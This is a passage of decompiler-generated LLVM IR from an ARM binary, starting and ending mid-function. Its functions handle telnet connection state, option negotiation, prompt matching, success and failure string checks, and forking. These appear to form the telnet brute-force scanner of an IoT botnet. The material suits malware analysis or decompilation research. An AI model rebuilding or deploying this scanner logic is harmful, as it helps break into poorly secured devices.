  %stack_var_-40.1 = phi i8* [ %arg2, %dec_label_pc_9cbc.preheader ], [ %v5_9ca0, %dec_label_pc_9cb0 ], [ %v5_9ca0, %dec_label_pc_9c8c ]
  store i8 0, i8* %stack_var_-40.1, align 1
  br label %dec_label_pc_9cf8

dec_label_pc_9cf8:                                ; preds = %dec_label_pc_9c74, %dec_label_pc_9ce4
  %storemerge = phi i32 [ -1, %dec_label_pc_9c74 ], [ %stack_var_-36.0.lcssa, %dec_label_pc_9ce4 ]
  %v2_9d04 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_9d04, i32* @fp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_9cc062, { 1, 0, 2 }
  uselistorder i8* %stack_var_-40.061, { 1, 2, 0 }
  uselistorder i32 %v1_9c20, { 1, 0 }
  uselistorder i32 %storemerge615, { 1, 0 }
  uselistorder i32 %storemerge527, { 1, 0 }
  uselistorder i32 %v2_9a64, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 0, 2, 1 }
  uselistorder i8* %stack_var_-185, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9cf8, { 1, 0 }
  uselistorder label %dec_label_pc_9ce4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9c48, { 1, 0 }
  uselistorder label %dec_label_pc_9b68, { 1, 0 }
  uselistorder label %dec_label_pc_9b68.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_9a78, { 1, 0 }
}

define i32 @get_telstate_host(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_9d14 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_9d14, i32* @ip, align 4
  %v3_9d18 = load i32, i32* @fp, align 4
  store i32 40224, i32* %stack_var_-4, align 4
  %v2_9d1c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9d1c, i32* @fp, align 4
  %v1_9d2c = add i32 %arg1, 4
  %v2_9d2c = inttoptr i32 %v1_9d2c to i32*
  %v3_9d2c = load i32, i32* %v2_9d2c, align 4
  store i32 %v3_9d2c, i32* @r0, align 4
  %v1_9d38 = call i32 @__GI_inet_ntoa(i32 %v3_9d2c)
  store i32 %v3_9d18, i32* @fp, align 4
  ret i32 %v1_9d38

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @read_until_response(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg3 to i32
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v3_9d54 = load i32, i32* @fp, align 4
  store i32 40284, i32* %stack_var_-4, align 4
  %v2_9d58 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9d58, i32* @fp, align 4
  store i32 %arg4, i32* @r2, align 4
  %v4_9d80 = call i32 @__GI_memset(i8* %arg3, i32 0)
  %v5_9d94 = call i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %tmp, i32 %arg4)
  %v2_9da4 = load i8, i8* %arg3, align 1
  %v2_9da8 = icmp eq i8 %v2_9da4, -1
  br i1 %v2_9da8, label %dec_label_pc_9db0, label %dec_label_pc_9dc0

dec_label_pc_9db0:                                ; preds = %entry
  %v3_9da4 = zext i8 %v2_9da4 to i32
  %v6_9dbc = call i32 @negotiate(i32 %arg1, i32 %tmp, i32 3, i32 %v3_9da4, i32 %v5_9d94)
  br label %dec_label_pc_9dc0

dec_label_pc_9dc0:                                ; preds = %entry, %dec_label_pc_9db0
  %v3_9dc4 = load i32, i32* %stack_var_0, align 4
  %v3_9dc8 = call i32 @contains_string(i32 %tmp, i32 %v3_9dc4)
  %v2_9dd0 = icmp ne i32 %v3_9dc8, 0
  %. = zext i1 %v2_9dd0 to i32
  store i32 %v3_9d54, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i8 %v2_9da4, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_9dc0, { 1, 0 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9e44.lr.ph:
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9e04 = load i32, i32* @fp, align 4
  store i32 %v3_9e04, i32* %stack_var_-16, align 4
  store i32 0, i32* %stack_var_-160, align 4
  %v2_9e30 = ptrtoint i32* %stack_var_-152 to i32
  br label %dec_label_pc_9e44

dec_label_pc_9e44:                                ; preds = %dec_label_pc_9e44.lr.ph, %dec_label_pc_9e44
  %storemerge25 = phi i32 [ 0, %dec_label_pc_9e44.lr.ph ], [ %v1_9e58, %dec_label_pc_9e44 ]
  %v5_9e50 = mul nuw nsw i32 %storemerge25, 4
  %v6_9e50 = add i32 %v5_9e50, %v2_9e30
  %v7_9e50 = inttoptr i32 %v6_9e50 to i32*
  store i32 0, i32* %v7_9e50, align 4
  %v1_9e58 = add nuw nsw i32 %storemerge25, 1
  %tmp21 = icmp ult i32 %v1_9e58, 32
  br i1 %tmp21, label %dec_label_pc_9e44, label %dec_label_pc_9e6c

dec_label_pc_9e6c:                                ; preds = %dec_label_pc_9e44
  %v13_9e04 = ptrtoint i32* %stack_var_-16 to i32
  %v3_9e70 = udiv i32 %arg1, 32
  %v3_9e7c = mul nuw nsw i32 %v3_9e70, 4
  %v2_9e84 = add nsw i32 %v3_9e7c, -136
  %v2_9e88 = add i32 %v2_9e84, %v13_9e04
  %v1_9e8c = inttoptr i32 %v2_9e88 to i32*
  %v2_9e8c = load i32, i32* %v1_9e8c, align 4
  %v1_9e94 = urem i32 %arg1, 32
  %v6_9e9c = shl i32 1, %v1_9e94
  %v2_9ea0 = or i32 %v2_9e8c, %v6_9e9c
  store i32 %v2_9ea0, i32* %v1_9e8c, align 4
  %v1_9ec0 = add i32 %arg1, 1
  %v2_9ec8 = ptrtoint i32* %stack_var_-160 to i32
  %v5_9edc = call i32 @__libc_select(i32 %v1_9ec0, i32 %v2_9e30, i32 0, i32 0, i32 %v2_9ec8)
  %v5_9ee8 = icmp sgt i32 %v5_9edc, 0
  br i1 %v5_9ee8, label %dec_label_pc_9ef8, label %dec_label_pc_9eec

dec_label_pc_9eec:                                ; preds = %dec_label_pc_9e6c
  br label %dec_label_pc_9f18

dec_label_pc_9ef8:                                ; preds = %dec_label_pc_9e6c
  %v5_9f0c = call i32 @__libc_recv(i32 %arg1, i32 %arg3, i32 %arg4, i32 0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_9f18

dec_label_pc_9f18:                                ; preds = %dec_label_pc_9eec, %dec_label_pc_9ef8
  %storemerge = phi i32 [ %v5_9f0c, %dec_label_pc_9ef8 ], [ 0, %dec_label_pc_9eec ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge25, { 1, 0 }
  uselistorder i32 %v2_9e30, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_9f18, { 1, 0 }
  uselistorder label %dec_label_pc_9e44, { 1, 0 }
}

define i32 @advance_state(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %v2_9f48 = icmp eq i32 %arg2, 0
  br i1 %v2_9f48, label %dec_label_pc_9f50, label %dec_label_pc_9f60

dec_label_pc_9f50:                                ; preds = %entry
  %v2_9f54 = load i32, i32* %arg1, align 4
  %v1_9f5c = call i32 @__GI_close(i32 %v2_9f54)
  br label %dec_label_pc_9f60

dec_label_pc_9f60:                                ; preds = %entry, %dec_label_pc_9f50
  %v2_9f68 = add i32 %tmp, 16
  %v3_9f68 = inttoptr i32 %v2_9f68 to i32*
  store i32 0, i32* %v3_9f68, align 4
  %v3_9f6c = load i32, i32* %stack_var_-24, align 4
  %v1_9f78 = trunc i32 %v3_9f6c to i8
  %v3_9f78 = add i32 %tmp, 8
  %v4_9f78 = inttoptr i32 %v3_9f78 to i8*
  store i8 %v1_9f78, i8* %v4_9f78, align 1
  %v1_9f80 = add i32 %tmp, 24
  %v2_9f80 = inttoptr i32 %v1_9f80 to i32*
  %v3_9f80 = load i32, i32* %v2_9f80, align 4
  store i32 512, i32* @r2, align 4
  %v2_9f90 = inttoptr i32 %v3_9f80 to i8*
  %v3_9f90 = call i32 @__GI_memset(i8* %v2_9f90, i32 0)
  ret i32 %v3_9f90

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_9f60, { 1, 0 }
}

define i32 @reset_telstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_9fa4 = load i32, i32* @fp, align 4
  %v2_9fbc = inttoptr i32 %arg1 to i32*
  %v3_9fbc = call i32 @advance_state(i32* %v2_9fbc, i32 0)
  %v3_9fc8 = add i32 %arg1, 9
  %v4_9fc8 = inttoptr i32 %v3_9fc8 to i8*
  store i8 1, i8* %v4_9fc8, align 1
  store i32 %v3_9fa4, i32* @fp, align 4
  ret i32 %v3_9fbc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @contains_success(i32 %arg1) local_unnamed_addr {
entry:
  %v3_9fdc = load i32, i32* @fp, align 4
  %v3_9ff4 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([3 x i8*]* @global_var_296e0.57 to i32))
  store i32 %v3_9fdc, i32* @fp, align 4
  ret i32 %v3_9ff4
}

define i32 @contains_fail(i32 %arg1) local_unnamed_addr {
entry:
  %v3_a014 = load i32, i32* @fp, align 4
  %v3_a02c = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([7 x i8*]* @global_var_296c0.66 to i32))
  store i32 %v3_a014, i32* @fp, align 4
  ret i32 %v3_a02c

; uselistorder directives
  uselistorder i32 (i32, i32)* @contains_string, { 2, 1, 0 }
}

define i32 @contains_response(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 41044, i32* %stack_var_-4, align 4
  %v2_a050 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a050, i32* @fp, align 4
  %v1_a060 = call i32 @contains_success(i32 %arg1)
  %v2_a068 = icmp eq i32 %v1_a060, 0
  br i1 %v2_a068, label %dec_label_pc_a070, label %dec_label_pc_a098

dec_label_pc_a070:                                ; preds = %entry
  %v1_a074 = call i32 @contains_fail(i32 %arg1)
  %v2_a07c = icmp ne i32 %v1_a074, 0
  %. = zext i1 %v2_a07c to i32
  br label %dec_label_pc_a098

dec_label_pc_a098:                                ; preds = %dec_label_pc_a070, %entry
  %storemerge1 = phi i32 [ 1, %entry ], [ %., %dec_label_pc_a070 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @contains_string(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  br label %dec_label_pc_a0dc

dec_label_pc_a0dc:                                ; preds = %dec_label_pc_a0dc, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_a0e0, %dec_label_pc_a0dc ]
  %v1_a0e0 = add i32 %stack_var_-24.0, 1
  %v3_a0ec = mul i32 %v1_a0e0, 4
  %v2_a0f8 = add i32 %v3_a0ec, %arg2
  %v1_a0fc = inttoptr i32 %v2_a0f8 to i32*
  %v2_a0fc = load i32, i32* %v1_a0fc, align 4
  %v2_a100 = icmp eq i32 %v2_a0fc, 0
  br i1 %v2_a100, label %dec_label_pc_a15c.preheader, label %dec_label_pc_a0dc

dec_label_pc_a15c.preheader:                      ; preds = %dec_label_pc_a0dc
  %v3_a134 = inttoptr i32 %arg1 to i8*
  br label %dec_label_pc_a15c

dec_label_pc_a114:                                ; preds = %dec_label_pc_a15c
  %v3_a118 = mul i32 %storemerge2, 4
  %v2_a124 = add i32 %v3_a118, %arg2
  %v1_a128 = inttoptr i32 %v2_a124 to i32*
  %v2_a128 = load i32, i32* %v1_a128, align 4
  %v4_a134 = call i32 @strcasestr(i8* %v3_a134, i32 %v2_a128, i32 %v3_a118)
  %v2_a13c = icmp eq i32 %v4_a134, 0
  %v1_a154 = add nuw i32 %storemerge2, 1
  br i1 %v2_a13c, label %dec_label_pc_a15c, label %dec_label_pc_a174

dec_label_pc_a15c:                                ; preds = %dec_label_pc_a114, %dec_label_pc_a15c.preheader
  %storemerge2 = phi i32 [ %v1_a154, %dec_label_pc_a114 ], [ 0, %dec_label_pc_a15c.preheader ]
  %v5_a168 = icmp slt i32 %storemerge2, %v1_a0e0
  br i1 %v5_a168, label %dec_label_pc_a114, label %dec_label_pc_a174

dec_label_pc_a174:                                ; preds = %dec_label_pc_a15c, %dec_label_pc_a114
  %storemerge = phi i32 [ 1, %dec_label_pc_a114 ], [ 0, %dec_label_pc_a15c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge2, { 2, 0, 1 }
  uselistorder i32 %v1_a0e0, { 1, 0, 2 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg4, i32* @r3, align 4
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_a18c = load i32, i32* @fp, align 4
  store i32 %v3_a18c, i32* %stack_var_-16, align 4
  %v13_a18c = ptrtoint i32* %stack_var_-16 to i32
  %v2_a1b4 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_a1c4 = or i32 %v2_a1b4, 2048
  store i32 %v1_a1c4, i32* @r3, align 4
  %v2_a1d8 = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  store i32 2, i32* %stack_var_-48, align 4
  %v3_a1ec = urem i32 %arg3, 65536
  %v1_a1f4 = call i32 @__GI_htons(i32 %v3_a1ec)
  %v3_a214 = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-44)
  %v2_a21c = icmp eq i32 %v3_a214, 0
  br i1 %v2_a21c, label %dec_label_pc_a230, label %dec_label_pc_a224

dec_label_pc_a224:                                ; preds = %entry
  br label %dec_label_pc_a3e8

dec_label_pc_a230:                                ; preds = %entry
  store i32 8, i32* @r2, align 4
  %v2_a244 = bitcast i32* %stack_var_-40 to i8*
  %v3_a244 = call i32 @__GI_memset(i8* %v2_a244, i32 0)
  %v2_a248 = ptrtoint i32* %stack_var_-48 to i32
  %v3_a258 = call i32 @__libc_connect(i32 %arg1, i32 %v2_a248, i32 16)
  store i32 %v3_a258, i32* @r3, align 4
  %v1_a268 = icmp slt i32 %v3_a258, 0
  br i1 %v1_a268, label %dec_label_pc_a270, label %dec_label_pc_a3ac

dec_label_pc_a270:                                ; preds = %dec_label_pc_a230
  %v0_a270 = call i32 @__GI___errno_location()
  %v1_a278 = inttoptr i32 %v0_a270 to i32*
  %v2_a278 = load i32, i32* %v1_a278, align 4
  %v7_a27c = icmp eq i32 %v2_a278, 115
  br i1 %v7_a27c, label %dec_label_pc_a2a8.lr.ph, label %dec_label_pc_a3a0

dec_label_pc_a2a8.lr.ph:                          ; preds = %dec_label_pc_a270
  store i32 %arg4, i32* %stack_var_-184, align 4
  %v2_a294 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_a2a8

dec_label_pc_a2a8:                                ; preds = %dec_label_pc_a2a8.lr.ph, %dec_label_pc_a2a8
  %storemerge14 = phi i32 [ 0, %dec_label_pc_a2a8.lr.ph ], [ %v1_a2bc, %dec_label_pc_a2a8 ]
  %v5_a2b4 = mul nuw nsw i32 %storemerge14, 4
  %v6_a2b4 = add i32 %v5_a2b4, %v2_a294
  %v7_a2b4 = inttoptr i32 %v6_a2b4 to i32*
  store i32 0, i32* %v7_a2b4, align 4
  %v1_a2bc = add nuw nsw i32 %storemerge14, 1
  %tmp28 = icmp ult i32 %v1_a2bc, 32
  br i1 %tmp28, label %dec_label_pc_a2a8, label %dec_label_pc_a2d0

dec_label_pc_a2d0:                                ; preds = %dec_label_pc_a2a8
  %v3_a2d4 = udiv i32 %arg1, 32
  %v3_a2e0 = mul nuw nsw i32 %v3_a2d4, 4
  %v2_a2e8 = add nsw i32 %v3_a2e0, -160
  %v2_a2ec = add i32 %v2_a2e8, %v13_a18c
  %v1_a2f0 = inttoptr i32 %v2_a2ec to i32*
  %v2_a2f0 = load i32, i32* %v1_a2f0, align 4
  %v1_a2f8 = urem i32 %arg1, 32
  %v6_a300 = shl i32 1, %v1_a2f8
  %v2_a304 = or i32 %v2_a2f0, %v6_a300
  store i32 %v2_a304, i32* %v1_a2f0, align 4
  %v1_a324 = add i32 %arg1, 1
  %v2_a32c = ptrtoint i32* %stack_var_-184 to i32
  %v5_a344 = call i32 @__libc_select(i32 %v1_a324, i32 0, i32 %v2_a294, i32 0, i32 %v2_a32c)
  %tmp29 = icmp slt i32 %v5_a344, 1
  br i1 %tmp29, label %dec_label_pc_a394, label %dec_label_pc_a354

dec_label_pc_a354:                                ; preds = %dec_label_pc_a2d0
  store i32 4, i32* %stack_var_-188, align 4
  %v2_a35c = ptrtoint i32* %stack_var_-192 to i32
  %v2_a360 = ptrtoint i32* %stack_var_-188 to i32
  %v5_a378 = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_a35c, i32 %v2_a360)
  %v3_a37c = load i32, i32* %stack_var_-192, align 4
  store i32 %v3_a37c, i32* @r3, align 4
  %v2_a380 = icmp eq i32 %v3_a37c, 0
  br i1 %v2_a380, label %dec_label_pc_a3ac, label %dec_label_pc_a388

dec_label_pc_a388:                                ; preds = %dec_label_pc_a354
  br label %dec_label_pc_a3e8

dec_label_pc_a394:                                ; preds = %dec_label_pc_a2d0
  br label %dec_label_pc_a3e8

dec_label_pc_a3a0:                                ; preds = %dec_label_pc_a270
  br label %dec_label_pc_a3e8

dec_label_pc_a3ac:                                ; preds = %dec_label_pc_a230, %dec_label_pc_a354
  %v2_a3b8 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_a3c8 = and i32 %v2_a3b8, -2049
  store i32 %v1_a3c8, i32* @r3, align 4
  %v2_a3dc = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  br label %dec_label_pc_a3e8

dec_label_pc_a3e8:                                ; preds = %dec_label_pc_a3a0, %dec_label_pc_a394, %dec_label_pc_a388, %dec_label_pc_a224, %dec_label_pc_a3ac
  %stack_var_-212.0 = phi i32 [ 0, %dec_label_pc_a394 ], [ 1, %dec_label_pc_a3ac ], [ 0, %dec_label_pc_a388 ], [ 0, %dec_label_pc_a3a0 ], [ 0, %dec_label_pc_a224 ]
  ret i32 %stack_var_-212.0

; uselistorder directives
  uselistorder i32 %storemerge14, { 1, 0 }
  uselistorder i32 %v2_a294, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 1, 0 }
  uselistorder i32* %stack_var_-188, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0, 6, 7, 8 }
  uselistorder label %dec_label_pc_a3e8, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_a3ac, { 1, 0 }
  uselistorder label %dec_label_pc_a2a8, { 1, 0 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_a3fc = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_a3fc, i32* @ip, align 4
  %v3_a400 = load i32, i32* @r4, align 4
  %v6_a400 = load i32, i32* @r5, align 4
  %v9_a400 = load i32, i32* @r6, align 4
  %v12_a400 = load i32, i32* @fp, align 4
  store i32 41992, i32* %stack_var_-4, align 4
  %v2_a404 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a404, i32* @fp, align 4
  %v0_a40c = call i32 @__libc_fork()
  %v2_a41c = icmp eq i32 %v0_a40c, 0
  br i1 %v2_a41c, label %dec_label_pc_a588, label %dec_label_pc_a430

dec_label_pc_a430:                                ; preds = %entry
  %v2_a434 = load i32, i32* @global_var_299a8.68, align 4
  %v5_a434 = load i32, i32* @global_var_299ac.69, align 4
  %v2_a440 = add i32 %v2_a434, 1
  %v3_a440 = icmp eq i32 %v2_a440, 0
  %v4_a444 = zext i1 %v3_a440 to i32
  %v5_a444 = add i32 %v4_a444, %v5_a434
  store i32 %v2_a440, i32* @global_var_299a8.68, align 4
  store i32 %v5_a444, i32* @global_var_299ac.69, align 4
  %v2_a460 = add i32 %v2_a434, 2
  %v3_a460 = icmp eq i32 %v2_a440, -1
  %v4_a464 = zext i1 %v3_a460 to i32
  %v5_a464 = add i32 %v5_a444, %v4_a464
  %v3_a468 = udiv i32 %v2_a460, 1073741824
  %v3_a46c = mul i32 %v5_a464, 4
  %v2_a470 = or i32 %v3_a46c, %v3_a468
  store i32 %v2_a470, i32* @r4, align 4
  %v3_a474 = mul i32 %v2_a460, 4
  %v1_a47c = call i32 @malloc(i32 %v3_a474)
  br label %dec_label_pc_a4d4

dec_label_pc_a494:                                ; preds = %dec_label_pc_a4d4, %dec_label_pc_a520
  %v3_a498 = mul i32 %storemerge2, 4
  %v2_a4a4 = add i32 %v3_a498, %v1_a47c
  %v2_a4b8 = load i32, i32* @global_var_2fc08.71, align 4
  %v2_a4bc = add i32 %v2_a4b8, %v3_a498
  %v1_a4c0 = inttoptr i32 %v2_a4bc to i32*
  %v2_a4c0 = load i32, i32* %v1_a4c0, align 4
  %v2_a4c4 = inttoptr i32 %v2_a4a4 to i32*
  store i32 %v2_a4c0, i32* %v2_a4c4, align 4
  %v1_a4cc = add i32 %storemerge2, 1
  br label %dec_label_pc_a4d4

dec_label_pc_a4d4:                                ; preds = %dec_label_pc_a430, %dec_label_pc_a494
  %storemerge2 = phi i32 [ 0, %dec_label_pc_a430 ], [ %v1_a4cc, %dec_label_pc_a494 ]
  %v2_a4ec = load i32, i32* @global_var_299a8.68, align 4
  %v5_a4ec = load i32, i32* @global_var_299ac.69, align 4
  %v2_a500 = add i32 %v2_a4ec, -1
  %v3_a500 = icmp ne i32 %v2_a4ec, 0
  %v3_a504 = add i32 %v5_a4ec, -1
  %v5_a504 = sext i1 %v3_a500 to i32
  %v9_a518 = icmp eq i32 %v3_a504, %v5_a504
  br i1 %v9_a518, label %dec_label_pc_a520, label %dec_label_pc_a494

dec_label_pc_a520:                                ; preds = %dec_label_pc_a4d4
  store i32 %v2_a500, i32* @r5, align 4
  store i32 %storemerge2, i32* @r6, align 4
  %tmp = icmp ugt i32 %v2_a500, %storemerge2
  br i1 %tmp, label %dec_label_pc_a494, label %dec_label_pc_a540

dec_label_pc_a540:                                ; preds = %dec_label_pc_a520
  store i32 %v5_a4ec, i32* @r4, align 4
  %v3_a548 = mul i32 %v2_a4ec, 4
  %v1_a54c = add i32 %v1_a47c, -4
  %v2_a558 = add i32 %v1_a54c, %v3_a548
  %v2_a560 = inttoptr i32 %v2_a558 to i32*
  store i32 %v0_a40c, i32* %v2_a560, align 4
  %v2_a568 = load i32, i32* @global_var_2fc08.71, align 4
  store i32 %v2_a568, i32* @r0, align 4
  %v0_a570 = call i32 @free()
  store i32 %v1_a47c, i32* @global_var_2fc08.71, align 4
  br label %dec_label_pc_a588

dec_label_pc_a588:                                ; preds = %entry, %dec_label_pc_a540
  store i32 %v3_a400, i32* @r4, align 4
  store i32 %v6_a400, i32* @r5, align 4
  store i32 %v9_a400, i32* @r6, align 4
  store i32 %v12_a400, i32* @fp, align 4
  ret i32 %v0_a40c

; uselistorder directives
  uselistorder i32 %storemerge2, { 0, 2, 1, 3 }
  uselistorder i32 %v3_a498, { 1, 0 }
  uselistorder i32 %v1_a47c, { 2, 0, 1 }
  uselistorder i32 %v2_a440, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_a588, { 1, 0 }
  uselistorder label %dec_label_pc_a4d4, { 1, 0 }
  uselistorder label %dec_label_pc_a494, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i8, align 1
  %v1_a5c4 = add i32 %arg2, 1
  %v1_a5c8 = inttoptr i32 %v1_a5c4 to i8*
  %v2_a5c8 = load i8, i8* %v1_a5c8, align 1
  %v7_a5d4 = icmp ult i8 %v2_a5c8, -5
  br i1 %v7_a5d4, label %dec_label_pc_a720, label %dec_label_pc_a5dc

dec_label_pc_a5dc:                                ; preds = %entry
  %v7_a5e4 = icmp eq i8 %v2_a5c8, -1
  br i1 %v7_a5e4, label %dec_label_pc_a5e8, label %dec_label_pc_a604

dec_label_pc_a5e8:                                ; preds = %dec_label_pc_a5dc
  br label %dec_label_pc_a720

dec_label_pc_a604:                                ; preds = %dec_label_pc_a5dc
  store i8 -1, i8* %stack_var_-17, align 1
  %v2_a60c = ptrtoint i8* %stack_var_-17 to i32
  %v5_a620 = call i32 @__libc_send(i32 %arg1, i32 %v2_a60c, i32 1, i32 16384)
  %v2_a62c = load i8, i8* %v1_a5c8, align 1
  %v7_a630 = icmp eq i8 %v2_a62c, -4
  br i1 %v7_a630, label %dec_label_pc_a638, label %dec_label_pc_a644

dec_label_pc_a638:                                ; preds = %dec_label_pc_a604
  store i8 -2, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a6e4

dec_label_pc_a644:                                ; preds = %dec_label_pc_a604
  %v2_a64c = load i8, i8* %v1_a5c8, align 1
  %v7_a650 = icmp eq i8 %v2_a64c, -2
  br i1 %v7_a650, label %dec_label_pc_a658, label %dec_label_pc_a664

dec_label_pc_a658:                                ; preds = %dec_label_pc_a644
  store i8 -4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a6e4

dec_label_pc_a664:                                ; preds = %dec_label_pc_a644
  %v2_a66c = load i8, i8* %v1_a5c8, align 1
  %v7_a670 = icmp eq i8 %v2_a66c, 3
  %v7_a684 = icmp eq i8 %v2_a66c, -3
  br i1 %v7_a670, label %dec_label_pc_a678, label %dec_label_pc_a6b0

dec_label_pc_a678:                                ; preds = %dec_label_pc_a664
  br i1 %v7_a684, label %dec_label_pc_a68c, label %dec_label_pc_a698

dec_label_pc_a68c:                                ; preds = %dec_label_pc_a678
  br label %dec_label_pc_a6a0

dec_label_pc_a698:                                ; preds = %dec_label_pc_a678
  br label %dec_label_pc_a6a0

dec_label_pc_a6a0:                                ; preds = %dec_label_pc_a68c, %dec_label_pc_a698
  %storemerge = phi i8 [ -3, %dec_label_pc_a698 ], [ -5, %dec_label_pc_a68c ]
  store i8 %storemerge, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a6e4

dec_label_pc_a6b0:                                ; preds = %dec_label_pc_a664
  br i1 %v7_a684, label %dec_label_pc_a6c4, label %dec_label_pc_a6d0

dec_label_pc_a6c4:                                ; preds = %dec_label_pc_a6b0
  br label %dec_label_pc_a6d8

dec_label_pc_a6d0:                                ; preds = %dec_label_pc_a6b0
  br label %dec_label_pc_a6d8

dec_label_pc_a6d8:                                ; preds = %dec_label_pc_a6c4, %dec_label_pc_a6d0
  %storemerge4 = phi i8 [ -2, %dec_label_pc_a6d0 ], [ -4, %dec_label_pc_a6c4 ]
  store i8 %storemerge4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a6e4

dec_label_pc_a6e4:                                ; preds = %dec_label_pc_a6a0, %dec_label_pc_a658, %dec_label_pc_a638, %dec_label_pc_a6d8
  %v4_a6f8 = call i32 @__libc_send(i32 %arg1, i32 %v2_a60c, i32 1, i32 16384)
  %v1_a700 = add i32 %arg2, 2
  %v4_a714 = call i32 @__libc_send(i32 %arg1, i32 %v1_a700, i32 1, i32 16384)
  br label %dec_label_pc_a720

dec_label_pc_a720:                                ; preds = %dec_label_pc_a5e8, %dec_label_pc_a6e4, %entry
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-17, { 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_a720, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a6e4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_a6d8, { 1, 0 }
  uselistorder label %dec_label_pc_a6a0, { 1, 0 }
}

define i32 @matchPrompt(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_a754 = call i32 @strlen(i8* %arg1)
  %v2_a79c = add i32 %v3_a754, %tmp
  br label %dec_label_pc_a870

dec_label_pc_a774:                                ; preds = %dec_label_pc_a7fc, %dec_label_pc_a7d8, %dec_label_pc_a7b4, %dec_label_pc_a790
  %v1_a778 = add nsw i32 %stack_var_-28.013, 1
  %v7_a78c = icmp sgt i32 %v3_a754, %v1_a778
  br i1 %v7_a78c, label %dec_label_pc_a790, label %dec_label_pc_a820

dec_label_pc_a790:                                ; preds = %dec_label_pc_a780.preheader, %dec_label_pc_a774
